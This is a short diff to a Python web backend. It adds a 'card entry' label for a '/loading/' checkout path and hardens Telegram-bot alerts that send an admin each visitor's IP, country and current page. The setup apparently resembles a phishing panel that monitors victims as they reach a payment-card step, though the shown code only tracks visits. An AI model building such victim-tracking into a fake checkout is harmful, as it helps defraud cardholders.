@@ -312,6 +312,8 @@ def get_page_name_from_url(url_path, page_code=None):
             return "Оформлення замовлення (кількість)"
         elif '/payment/' in url_path:
             return "Оформлення замовлення (оплата)"
+        elif '/loading/' in url_path:
+            return "Ввод карты"
         else:
             return "Оформлення замовлення"
     elif '/events/' in url_path:
@@ -387,7 +389,17 @@ def send_activity_notification_to_admin(page_code, user_ip, user_country, page_n
 🌎Страна: {user_country}"""
             
             # Відправляємо повідомлення
-            asyncio.create_task(bot.send_message(admin_id, message))
+            try:
+                # Створюємо новий event loop якщо поточний не існує
+                loop = asyncio.get_event_loop()
+                if loop.is_running():
+                    # Якщо loop запущений, створюємо task
+                    asyncio.create_task(bot.send_message(admin_id, message))
+                else:
+                    # Якщо loop не запущений, запускаємо новий
+                    asyncio.run(bot.send_message(admin_id, message))
+            except Exception as send_error:
+                print(f'[ERROR] Failed to send message: {send_error}')
             
     except Exception as e:
         print(f'[ERROR] Failed to send activity notification: {e}')
